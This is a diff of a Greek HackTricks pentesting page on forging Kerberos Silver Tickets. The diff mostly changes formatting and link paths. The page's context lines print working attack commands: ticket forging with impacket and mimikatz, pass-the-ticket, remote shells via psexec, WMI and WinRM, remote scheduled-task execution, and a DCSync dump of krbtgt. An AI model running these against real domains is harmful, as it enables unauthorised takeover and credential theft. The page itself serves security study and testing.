@@ -1,4 +1,4 @@
-# Ασημένιο Εισιτήριο
+# Silver Ticket
 
 <details>
 
@@ -27,12 +27,15 @@
 Για τη δημιουργία εισιτηρίων, χρησιμοποιούνται διαφορετικά εργαλεία ανάλογα με το λειτουργικό σύστημα:
 
 ### Σε Linux
+
 ```bash
 python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
 python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
+
 ### Στα Windows
+
 ```bash
 # Create the ticket
 mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"
@@ -44,18 +47,19 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
+
 ## Διαθέσιμες Υπηρεσίες
 
-| Τύπος Υπηρεσίας                           | Εισιτήρια Silver για την Υπηρεσία                                                     |
-| ------------------------------------------ | -------------------------------------------------------------------------------------- |
-| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                                |
-| Απομακρυσμένη Εντολή PowerShell         | <p>HOST</p><p>HTTP</p><p>Ανάλογα με το OS επίσης:</p><p>WSMAN</p><p>RPCSS</p>       |
-| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Σε κάποιες περιπτώσεις μπορείτε απλά να ζητήσετε: WINRM</p> |
-| Προγραμματισμένες Εργασίες              | HOST                                                                                   |
-| Κοινόχρηστος Φάκελος Windows, επίσης psexec | CIFS                                                                                 |
-| Λειτουργίες LDAP, περιλαμβάνεται το DCSync | LDAP                                                                                 |
+| Τύπος Υπηρεσίας                                        | Εισιτήρια Silver για την Υπηρεσία                                                    |
+| ------------------------------------------------------ | ------------------------------------------------------------------------------------ |
+| WMI                                                    | <p>HOST</p><p>RPCSS</p>                                                              |
+| Απομακρυσμένη Εντολή PowerShell                        | <p>HOST</p><p>HTTP</p><p>Ανάλογα με το OS επίσης:</p><p>WSMAN</p><p>RPCSS</p>        |
+| WinRM                                                  | <p>HOST</p><p>HTTP</p><p>Σε κάποιες περιπτώσεις μπορείτε απλά να ζητήσετε: WINRM</p> |
+| Προγραμματισμένες Εργασίες                             | HOST                                                                                 |
+| Κοινόχρηστος Φάκελος Windows, επίσης psexec            | CIFS                                                                                 |
+| Λειτουργίες LDAP, περιλαμβάνεται το DCSync             | LDAP                                                                                 |
 | Εργαλεία Διαχείρισης Απομακρυσμένου Διακομιστή Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                                   |
-| Golden Tickets                             | krbtgt                                                                               |
+| Golden Tickets                                         | krbtgt                                                                               |
 
 Χρησιμοποιώντας το **Rubeus** μπορείτε να **ζητήσετε όλα** αυτά τα εισιτήρια χρησιμοποιώντας την παράμετρο:
 
@@ -74,14 +78,17 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 ### CIFS
 
 Με αυτό το εισιτήριο θα μπορείτε να έχετε πρόσβαση στους φακέλους `C$` και `ADMIN$` μέσω **SMB** (αν είναι εκτεθειμένοι) και να αντιγράψετε αρχεία σε ένα τμήμα του απομακρυσμένου συστήματος αρχείων απλά κάνοντας κάτι σαν:
+
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
+
 ### ΚΕΝΤΡΙΚΟΣ ΥΠΟΛΟΓΙΣΤΗΣ
 
 Με αυτήν την άδεια μπορείτε να δημιουργήσετε προγραμματισμένες εργασίες σε απομακρυσμένους υπολογιστές και να εκτελέσετε αυθαίρετες εντολές:
+
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -93,9 +100,11 @@ schtasks /query /S some.vuln.pc
 #Run created schtask now
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
+
 ### HOST + RPCSS
 
 Με αυτά τα εισιτήρια μπορείτε **να εκτελέσετε το WMI στο σύστημα θύματος**:
+
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -105,22 +114,25 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
+
 Βρείτε **περισσότερες πληροφορίες σχετικά με το wmiexec** στην ακόλουθη σελίδα:
 
-{% content-ref url="../ntlm/wmicexec.md" %}
-[wmicexec.md](../ntlm/wmicexec.md)
+{% content-ref url="../lateral-movement/wmicexec.md" %}
+[wmicexec.md](../lateral-movement/wmicexec.md)
 {% endcontent-ref %}
 
 ### HOST + WSMAN (WINRM)
 
 Με πρόσβαση winrm σε έναν υπολογιστή μπορείτε **να έχετε πρόσβαση** και ακόμη να λάβετε ένα PowerShell:
+
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
+
 Ελέγξτε την ακόλουθη σελίδα για να μάθετε **περισσότερους τρόπους σύνδεσης με έναν απομακρυσμένο κόμβο χρησιμοποιώντας το winrm**:
 
-{% content-ref url="../ntlm/winrm.md" %}
-[winrm.md](../ntlm/winrm.md)
+{% content-ref url="../lateral-movement/winrm.md" %}
+[winrm.md](../lateral-movement/winrm.md)
 {% endcontent-ref %}
 
 {% hint style="warning" %}
@@ -130,9 +142,11 @@ New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ### LDAP
 
 Με αυτό το προνόμιο μπορείτε να αδειάσετε τη βάση δεδομένων DC χρησιμοποιώντας το **DCSync**:
+
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
+
 **Μάθετε περισσότερα σχετικά με το DCSync** στην ακόλουθη σελίδα:
 
 ## Αναφορές
@@ -160,6 +174,6 @@ mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.loc
 * Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs** στα αποθετήρια του **HackTricks**](https://github.com/carlospolop/hacktricks) και του [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs** στα αποθετήρια του **HackTricks**]\(https://github.com/carlospolop/hacktricks) και του [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
